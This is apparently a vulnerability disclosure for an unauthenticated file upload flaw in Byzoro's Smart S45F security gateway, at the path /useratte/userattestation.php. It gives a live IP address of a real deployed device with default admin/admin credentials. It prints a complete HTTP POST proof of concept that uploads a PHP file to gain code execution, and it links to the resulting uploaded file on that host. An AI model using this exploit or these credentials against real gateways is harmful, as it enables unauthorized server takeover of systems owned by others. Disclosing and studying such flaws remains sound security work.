Beijing Baizhuo Network Technology Co., Ltd. (hereinafter referred to as Baizhuo Network) is a high-tech enterprise dedicated to building the next generation of secure Internet. Byzro Networks Smart S45F multi-service security gateway intelligent management platform has a file upload vulnerability. Attackers can exploit vulnerabilities to gain server privileges or cause business impact on the system.

official：https://www.byzoro.com/

version: S45

Vulnerability Path ：/useratte/userattestation.php


Ip：https://103.121.164.62:8443/

Account password: admin/admin

poc：

```
POST /useratte/userattestation.php? HTTP/1.1
Host: 103.121.164.62:8443
Cookie: PHPSESSID=9321d2da1013654a59d0d684ae3f7438 
User-Agent: Mozilla/5.0 (Windows NT 6.1; Win64; x64; Trident/7.0; rv:11.0) like Gecko
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8
Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2
Accept-Encoding: gzip, deflate
Content-Type: multipart/form-data; boundary=---------------------------42328904123665875270630079328
Content-Length: 593
Origin: https://222.180.2.66:8443
Referer: https://222.180.2.66:8443/sysmanage/licence.php
Upgrade-Insecure-Requests: 1
Sec-Fetch-Dest: document
Sec-Fetch-Mode: navigate
Sec-Fetch-Site: same-origin
Sec-Fetch-User: ?1
Te: trailers
Connection: close

-----------------------------42328904123665875270630079328
Content-Disposition: form-data; name="web_img"; filename="1.php"
Content-Type: application/octet-stream

<?php phpinfo()?>
-----------------------------42328904123665875270630079328
Content-Disposition: form-data; name="id_type"

1
-----------------------------42328904123665875270630079328
Content-Disposition: form-data; name="1_ck"

1_radhttp
-----------------------------42328904123665875270630079328
Content-Disposition: form-data; name="hidwel"

set
-----------------------------42328904123665875270630079328—

```
<img width="601" alt="image" src="https://github.com/llixixi/cve/assets/144869546/76cf6fa8-f756-4ec3-8d46-e75d132b9558">


https://103.121.164.62:8443/upload/2.php

<img width="597" alt="image" src="https://github.com/llixixi/cve/assets/144869546/f1d2478a-44f7-4f11-bc24-7df29e220e50">


